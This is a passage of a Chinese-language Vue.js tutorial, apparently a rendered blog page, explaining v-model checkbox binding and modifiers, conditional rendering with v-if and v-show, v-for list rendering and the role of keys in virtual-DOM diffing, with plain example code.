class="string">&quot;#root&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">agree</span>:<span class="literal">true</span></span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144252.png" alt="  "></p>
+<hr>
+<h3 id="3-绑定多个复选框"><a href="#3-绑定多个复选框" class="headerlink" title="3. 绑定多个复选框"></a>3. 绑定多个复选框</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">value</span>=<span class="string">&quot;爬山&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;hobby&quot;</span>&gt;</span>爬山<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">value</span>=<span class="string">&quot;游泳&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;hobby&quot;</span>&gt;</span>游泳<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">value</span>=<span class="string">&quot;篮球&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;hobby&quot;</span>&gt;</span>篮球<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">el</span>:<span class="string">&quot;#root&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">		 	<span class="comment">//数组中的值,就是被选中的元素的value属性值</span></span></span><br><span class="line"><span class="language-javascript">		 	<span class="attr">hobby</span>:[<span class="string">&quot;爬山&quot;</span>,<span class="string">&quot;游泳&quot;</span>]</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="4-v-model修饰符"><a href="#4-v-model修饰符" class="headerlink" title="4. v-model修饰符"></a>4. v-model修饰符</h3><p><strong>为了方便对用户输入的内容进行处理，Vue 为 v-model 指令提供了 3 个修饰符</strong></p>
+<table>
+<thead>
+<tr>
+<th>修饰符</th>
+<th>作用</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>.number</code></td>
+<td>自动将用户的输入值转化为数值类型</td>
+<td><code>&lt;input v-model.number = &quot;age&quot; /&gt;</code></td>
+</tr>
+<tr>
+<td><code>.trim</code></td>
+<td>自动过滤用户输入的首尾空白字符</td>
+<td><code>&lt;input v-module.trim = &quot;msg&quot; /&gt;</code></td>
+</tr>
+<tr>
+<td><code>.lazy</code></td>
+<td>在 change 时而非 input 时更新</td>
+<td><code>&lt;input v-model.lazy = &quot;msg&quot; /&gt;</code></td>
+</tr>
+</tbody></table>
+<blockquote>
+<p><strong>lazy修饰符</strong> </p>
+<ul>
+<li>默认情况下， v-model 默认是在 input 事件中同步输入框的数据的。</li>
+<li>也就是说，一旦有数据发生改变对应的 data 中的数据就会自动发生改变。</li>
+<li>lazy 修饰符可以让数据在失去焦点或者回车时才会更新。</li>
+</ul>
+</blockquote>
+<hr>
+<h1 id="五、条件渲染指令"><a href="#五、条件渲染指令" class="headerlink" title="五、条件渲染指令"></a>五、条件渲染指令</h1><p><strong>条件渲染指令用来辅助开发者按需控制 DOM 的显示与隐藏 。 <code>v - if</code>、<code>v-else-if</code>、<code>v-else</code></strong><br><strong>这三个指令与JavaScript的条件语句 if、else、else if 类似，Vue 的条件指令可以根据表达式的值在DOM中渲染或销毁元素或组件</strong></p>
+<h2 id="1-v-if"><a href="#1-v-if" class="headerlink" title="1. v-if"></a>1. v-if</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-if</span>=<span class="string">&quot;age &gt;= 18&quot;</span>&gt;</span>你成年了<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">el</span>:<span class="string">&quot;#root&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">age</span>: <span class="number">20</span></span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>v-if的原理：</strong></p>
+<ul>
+<li>v-if 后面的条件为 false时，对应的元素以及子元素不会渲染，也就是根本没有对应的标签出现在DOM中</li>
+</ul>
+</blockquote>
+<hr>
+<h2 id="2-v-else-if"><a href="#2-v-else-if" class="headerlink" title="2. v-else-if"></a>2. v-else-if</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-if</span>=<span class="string">&quot;age &gt;= 18&quot;</span>&gt;</span>你成年了<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-else-if</span>=<span class="string">&quot;age &gt;= 12&quot;</span>&gt;</span>你是个小伙子<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h2 id="3-v-else"><a href="#3-v-else" class="headerlink" title="3. v-else"></a>3. v-else</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-if</span>=<span class="string">&quot;age &gt;= 18&quot;</span>&gt;</span>你成年了<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-else-if</span>=<span class="string">&quot;age &gt;= 12&quot;</span>&gt;</span>你是个小伙子<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-else</span>&gt;</span>你是个小学生<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="4-v-show"><a href="#4-v-show" class="headerlink" title="4. v-show"></a>4. v-show</h2><p><strong>v-show的用法和v-if非常相似，也用于决定一个元素是否渲染：</strong></p>
+<ul>
+<li>v-if 指令会 动态地创建或移除 DOM 元素 ，从而控制元素在页面上的显示与隐藏</li>
+<li>v-show 指令会动态为元素 &#x3D;&#x3D;添加或移除 style&#x3D;“display: none;” 样式&#x3D;&#x3D; ，从而控制元素的显示与隐藏</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-show</span>=<span class="string">&quot;age &gt;= 18&quot;</span>&gt;</span>你成年了<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">el</span>:<span class="string">&quot;#root&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">age</span>: <span class="number">17</span></span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144257.png" alt="  "></p>
+<hr>
+<h1 id="六、列表渲染指令"><a href="#六、列表渲染指令" class="headerlink" title="六、列表渲染指令"></a>六、列表渲染指令</h1><h2 id="1-v-for"><a href="#1-v-for" class="headerlink" title="1. v-for"></a>1. v-for</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>列表渲染<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>人员列表（遍历数组）<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(p,index) in persons&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span><br><span class="line">				&#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;</span><br><span class="line">			<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">		</span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>汽车信息（遍历对象）<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(value,k) in car&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;k&quot;</span>&gt;</span></span><br><span class="line">				&#123;&#123;k&#125;&#125;-&#123;&#123;value&#125;&#125;</span><br><span class="line">			<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">		</span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>遍历字符串<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(char,index) in str&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span><br><span class="line">				&#123;&#123;char&#125;&#125;-&#123;&#123;index&#125;&#125;</span><br><span class="line">			<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">		</span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>遍历指定次数<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(number,index) in 5&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span><br><span class="line">				&#123;&#123;index&#125;&#125;-&#123;&#123;number&#125;&#125;</span><br><span class="line">			<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	</span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">persons</span>:[</span></span><br><span class="line"><span class="language-javascript">					&#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="attr">age</span>:<span class="number">18</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">					&#123;<span class="attr">id</span>:<span class="string">&#x27;002&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;李四&#x27;</span>,<span class="attr">age</span>:<span class="number">19</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">					&#123;<span class="attr">id</span>:<span class="string">&#x27;003&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;王五&#x27;</span>,<span class="attr">age</span>:<span class="number">20</span>&#125;</span></span><br><span class="line"><span class="language-javascript">				],</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">car</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">					<span class="attr">name</span>:<span class="string">&#x27;奥迪A8&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">					<span class="attr">price</span>:<span class="string">&#x27;70万&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">					<span class="attr">color</span>:<span class="string">&#x27;黑色&#x27;</span></span></span><br><span class="line"><span class="language-javascript">				&#125;,</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">str</span>:<span class="string">&#x27;hello&#x27;</span></span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;)</span></span><br><span class="line"><span class="language-javascript">	</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144300.png" alt="  "></p>
+<hr>
+<h2 id="2-key作用与原理"><a href="#2-key作用与原理" class="headerlink" title="2. key作用与原理"></a>2. key作用与原理</h2><ul>
+<li>官方推荐我们在使用 <code>v-for</code>时，给对应的元素或组件加上一个 <code>:key</code>属性，key的作用主要是为了高效的更新虚拟DOM。当列表的数据变化时，默认情况下， Vue 会尽可能的复用已存在的 DOM 元素，从而提升渲染的性能 。</li>
+<li>但这种默认的性能优化策略，会导致有状态的列表无法被正确更新 。为了给 Vue 一个提示，以便它能跟踪每个节点的身份， 从而在保证有状态的列表被正确更新的前提下， 提升渲染的性能 。此时，需要为每项提供一个唯一的 key 属性。</li>
+</ul>
+<p><strong>案例引入：</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>key的原理<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>人员列表<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">button</span> @<span class="attr">click.once</span>=<span class="string">&quot;add&quot;</span>&gt;</span>添加老刘<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(p,index) in persons&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span><br><span class="line">				&#123;&#123;p.name&#125;&#125; - &#123;&#123;p.age&#125;&#125;</span><br><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">persons</span>:[</span></span><br><span class="line"><span class="language-javascript">					&#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="attr">age</span>:<span class="number">18</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">					&#123;<span class="attr">id</span>:<span class="string">&#x27;002&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;李四&#x27;</span>,<span class="attr">age</span>:<span class="number">19</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">					&#123;<span class="attr">id</span>:<span class="string">&#x27;003&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;王五&#x27;</span>,<span class="attr">age</span>:<span class="number">20</span>&#125;</span></span><br><span class="line"><span class="language-javascript">				]</span></span><br><span class="line"><span class="language-javascript">			&#125;,</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="title function_">add</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">					<span class="keyword">const</span> p = &#123;<span class="attr">id</span>:<span class="string">&#x27;004&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;老刘&#x27;</span>,<span class="attr">age</span>:<span class="number">40</span>&#125;</span></span><br><span class="line"><span class="language-javascript">					<span class="variable language_">this</span>.<span class="property">persons</span>.<span class="title function_">unshift</span>(p)</span></span><br><span class="line"><span class="language-javascript">				&#125;</span></span><br><span class="line"><span class="language-javascript">			&#125;,</span></span><br><span class="line"><span class="language-javascript">		&#125;)</span></span><br><span class="line"><span class="language-javascript">	</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>运行效果：</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144304.png" alt="  "></p>
+<hr>
+<p><strong>上述案例在增加了“老刘”后，每个人物后面的 input 输入框紊乱，现在我们把 <code>v-for</code> 的 <code>:key</code> 改为 <code>p.id</code> 试一试。</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(p,index) in persons&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;p.id&quot;</span>&gt;</span></span><br><span class="line">		&#123;&#123;p.name&#125;&#125; - &#123;&#123;p.age&#125;&#125;</span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>运行效果：</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144307.png" alt="  "></p>
+<hr>
+<p><strong>运行结果正常，要明白这其中的诡异，我们就得明白Vue的虚拟DOM对比算法。</strong></p>
+<blockquote>
+<p><strong>虚拟DOM中key的作用</strong>：</p>
+<p><code>key</code>是虚拟DOM中对象的标识，当数据发生变化时，Vue会根据&#x3D;&#x3D;新数据&#x3D;&#x3D;生成&#x3D;&#x3D;新的虚拟DOM&#x3D;&#x3D;，随后Vue进行&#x3D;&#x3D;新虚拟DOM&#x3D;&#x3D;与&#x3D;&#x3D;旧虚拟DOM&#x3D;&#x3D;的差异比较，比较规则如下：</p>
+<hr>
+<p><strong>对比规则</strong>：</p>
+<p>① 旧虚拟DOM中找到了与新虚拟DOM相同的<code>key</code>：</p>
+<ul>
+<li>若虚拟DOM中内容没变, 直接使用之前的真实DOM</li>
+<li>若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM</li>
+</ul>
+<p>  ② 旧虚拟DOM中未找到与新虚拟DOM相同的<code>key</code>：创建新的真实DOM，随后渲染到到页面</p>
+</blockquote>
+<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144310.png" alt="****"><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144418.png" alt="  "></p>
+<hr>
+<blockquote>
+<p><strong>用index作为key可能会引发的问题</strong>：</p>
+<p>① 若对数据进行逆序添加、逆序删除等破坏顺序操作：会产生没有必要的真实DOM更新，界面效果没问题, 但效率低<br>② 若结构中还包含输入类的DOM：会产生错误DOM更新，界面有问题</p>
+<hr>
+<p><strong>开发中如何选择key</strong>?</p>
+<p>① 最好使用每条数据的唯一标识作为key，比如id、手机号、身份证号、学号等唯一值<br>② 如果不存在对数据的逆序添加、逆序删除等破坏顺序的操作，仅用于渲染列表，使用index作为key是没有问题的</p>
+</blockquote>
+<hr>
+<h1 id="七、事件监听指令"><a href="#七、事件监听指令" class="headerlink" title="七、事件监听指令"></a>七、事件监听指令</h1><p>在前端开发中，我们经常需要监听点击、拖拽、键盘事件等等，这个时候需要使用 <code>v-on</code>。</p>
+<ul>
+<li>作用：绑定事件监听器</li>
+<li>缩写：<code>@</code></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>DOM对象</th>
+<th>vue事件绑定</th>
